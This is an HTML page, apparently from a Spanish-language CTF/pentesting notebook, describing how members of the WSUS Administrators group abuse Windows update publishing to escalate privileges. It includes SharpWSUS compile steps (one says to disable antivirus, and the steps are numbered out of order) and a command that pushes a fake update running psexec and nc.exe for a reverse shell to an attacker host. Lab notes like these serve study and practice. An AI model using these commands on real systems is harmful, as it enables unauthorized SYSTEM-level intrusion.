@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>WSUS Administrators | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="wsus-administrators">
+          <div class="note-tabbar">
+            <span>WSUS Administrators</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Grupos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / grupos</p>
+            <h2>WSUS Administrators</h2>
+
+            <p><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS.exe</a></p>
+
+            <aside class="callout warning">
+              <p>El abuso de WSUS depende de la configuración, permisos de publicación y confianza de clientes. No asumir compromiso automático sin comprobar el flujo de actualización.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Compilar SharpWSUS</h3>
+              <pre><code># 1. Abrir archivo.sln desde el visual morado
+# 2. Modo Release
+# 4. Desactivar Antivirus
+# 5. Iniciar
+# 3. Se genera el archivo.exe</code></pre>
+            </section>
+
+            <p><span class="notebook-review-note">[REVISAR]: imagen de Obsidian no migrada: Pasted image 20260401191117.png|468</span></p>
+
+            <h2>Explotación</h2>
+
+            <p><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS.exe</a> <a href="https://github.com/interference-security/kali-windows-binaries">psexec.exe</a></p>
+
+            <section class="code-card">
+              <h3>Escalada Privilegios</h3>
+              <pre><code># Listener Kali
+penelope -p 443
+
+# Windows
+# Subir nc.exe, psexec.exe y SharpWSUS.exe
+.\SharpWSUS.exe create /payload:&quot;C:\Users\&lt;user&gt;\desktop\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c C:\Users\&lt;user&gt;\desktop\nc.exe &lt;kali_ip&gt; 443 -e cmd.exe&quot; /title:&quot;pwned&quot;
+
+.\SharpWSUS.exe approve /updateid:&lt;id&gt; /computername:&lt;Hostname.Domain&gt; /groupname:&quot;pwned&quot;</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=outdated">Outdated</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>grupos</span>
+              <span>active_directory</span>
+              <span>wsus</span>
+              <span>administrators</span>
+              <span>wsus_administrators</span>
+              <span>compilar</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
